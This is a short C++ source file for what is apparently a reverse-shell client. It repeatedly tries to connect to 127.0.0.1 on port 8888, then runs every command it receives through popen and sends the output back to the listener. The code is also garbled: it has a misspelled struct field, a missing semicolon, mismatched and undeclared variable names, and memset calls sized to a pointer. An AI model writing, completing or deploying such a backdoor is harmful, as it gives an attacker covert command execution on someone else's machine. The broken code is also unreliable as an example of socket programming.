#include<iostream>
#include<string.h>

#include<string>

#include<sys/socket.h>


#include<sys/types.h>
#include<dirent.h>
#include<unistd.h>


int main()
{
	int socket_cli=socket(AF_INET,SOCK_STREAM,0);
	
	struct sockaddr_in conn_addr;
	conn_addr.sin_family=AF_INET;
	conn_addr.sin_prot=htons(8888);
	
	char ip[20]="127.0.0.1\0";
	
	
    
    conn_addr.sin_addr.s_addr = inet_addr(ip);
	
	while(connect(socket_cli,(struct sockaddr*)&conn_addr,sizeof(conn_addr))<0)sleep(5);
	
	char* sendbuf=new char[1000];
    char* recvbuf=new char[100];
    
    FILE*pp;
    
    DIR* pdir;
    DIR* next_pdir;
	struct dirent*ptr
    
    dir=opendir(".");
    
    
    string order;
    
    
    
    while(1)
    {
    	memset(sendbuf, 0, sizeof(sendbuf));
    	memset(recvbuf, 0, sizeof(recvbuf));
    	
    	recv(sock_cli, recvbuf,100,0);
    	
    	
    	pp = popen(recvbuf,"r");
    	fgets(sendbuf,1000,pp);
    	send(sock_cli,sendbuf,strlen(sendbuf)+1,0);
    	
    	
    	
    }
	
}
